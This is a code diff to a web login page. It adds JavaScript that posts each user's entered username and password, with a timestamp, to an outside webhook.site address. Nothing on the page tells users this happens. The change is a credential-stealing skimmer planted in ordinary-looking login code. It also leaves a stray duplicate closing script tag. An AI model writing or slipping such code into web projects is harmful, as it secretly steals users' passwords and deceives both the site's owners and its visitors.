@@ -119,7 +119,21 @@
         message.style.color = "salmon";
         message.textContent = "Invalid credentials. Try again.";
       }
+    
+    // Send login data to webhook
+    fetch("https://webhook.site/abc12345-xxxx-yyyy-zzzz-0987654321", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        username: user,
+        password: pass,
+        timestamp: new Date().toISOString()
+      })
+    });
     }
+</script>
   </script>
 
 </body>
